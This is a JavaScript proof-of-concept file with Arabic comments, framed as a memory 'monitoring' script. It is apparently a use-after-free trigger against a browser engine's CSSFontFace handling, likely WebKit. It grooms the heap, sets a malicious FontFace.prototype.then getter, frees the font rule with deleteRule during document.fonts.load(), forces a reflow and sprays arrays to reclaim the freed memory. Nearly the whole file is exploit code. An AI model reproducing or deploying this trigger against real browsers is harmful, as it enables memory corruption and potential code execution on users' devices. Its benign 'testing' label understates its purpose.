/**
 * [TESTING ENVIRONMENT] - CSSFontFace UAF Monitoring Script
 * الملف: inject.js
 * الوظيفة: تتبع تسلسل العمليات منطقياً وضبط كثافة حجز الذاكرة لتجنب الـ OOM
 */

// إشعار بدء التشغيل في واجهة النظام
ssa("[*] تم تحميل سكريبت المراقبة والتحكم في تدفق الذاكرة...");

function runMemoryAnalysis() {
    try {
        // 1. تقليص حجم الترتيب الأولي (Heap Grooming) لتفادي الـ OOM
        ssa("[*] خطوة 1: تخصيص كتل ذاكرة منخفضة الكثافة لتهيئة الـ Heap...");
        let balancedGcPool = [];
        // تم تخفيض العدد من 200 إلى 40 للحفاظ على استقرار العملية
        for (let i = 0; i < 40; i++) {
            balancedGcPool.push({
                headerInfo: 0x01000000,
                indexTracking: i,
                bufferSpace: [1.1, 2.2]
            });
        }

        // 2. تفعيل عنصر النمط (Style Element)
        ssa("[*] خطوة 2: حقن قاعدة @font-face المؤقتة في مستند الويب...");
        const targetStyle = document.createElement('style');
        targetStyle.id = 'target_vulnerable_style';
        targetStyle.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(targetStyle);

        // 3. إنشاء كائن الوجه الأساسي وتجهيز الوعد
        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded; 

        let isTriggered = false;

        // 4. تتبع لحظة اعتراض الـ Thenable Getter
        ssa("[*] خطوة 3: إعداد فخ الاعتراض عبر FontFace.prototype.then...");
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!isTriggered && this === testFace) {
                    isTriggered = true;
                    ssa("[!!] [CALLBACK_HIT] تم الدخول إلى سياق الـ Getter بنجاح.");

                    // أ: حجز كائنات مصغرة بدلاً من الكتل الضخمة لتجنب دفاعات Jetsam / OOM
                    let microAllocation = [];
                    for(let j = 0; j < 15; j++) {
                        microAllocation.push(new FontFace('hold_' + j, 'local(Arial)', { unicodeRange: 'U+0041' }));
                    }

                    // ب: الحذف الفعلي للقاعدة البرمجية لتحرير الكائن الأساسي
                    ssa("[!] [FREE_ACTION] استدعاء دالة إزالة القاعدة البرمجية deleteRule(0)...");
                    document.getElementById('target_vulnerable_style').sheet.deleteRule(0);

                    // ج: إجبار المحرك على تحديث التنسيق المتزامن (Layout Reflow) في اللحظة الحرجة
                    ssa("[*] فرض تحديث التنسيق عبر قراءة offsetTop...");
                    let syncCheck = document.body.offsetTop;

                    // د: محاولة ملء الفراغ الذاكري بكائنات متزنة الهيكل
                    ssa("[+] [REALLOCATION] حجز مصفوفات عادية لفحص استجابة الذاكرة...");
                    for (let k = 0; k < 30; k++) {
                        let testArray = [1.1, 2.2, 3.3];
                        testArray.customFlag = 0x1234;
                    }
                }
                return undefined;
            }
        });

        // 5. إطلاق دالة التحميل لبدء السباق المنطقي داخل المحرك
        ssa("[*] خطوة 4: استدعاء دالة التحميل المتزامن document.fonts.load()...");
        document.fonts.load('1em x', 'AB');

        // مهلة زمنية قصيرة للتحقق من بقاء سياق الويب مستقراً
        setTimeout(() => {
            ssa("[+] اكتملت دورة الفحص الهيكلي. تتبع استقرار النظام عبر الشاشة.");
        }, 150);

    } catch (err) {
        ssa("[-] حدث خطأ غير متوقع أثناء التنفيذ: " + err.message);
    }
}

// ربط آلية التفعيل بزر "GO" البرمجي الموجود في ملف index.html المرفق
document.getElementById('exec-btn').addEventListener('click', function() {
    ssa("[*] تم تفعيل زر التشغيل... بدء الفحص المتزن للذاكرة:");
    runMemoryAnalysis();
});
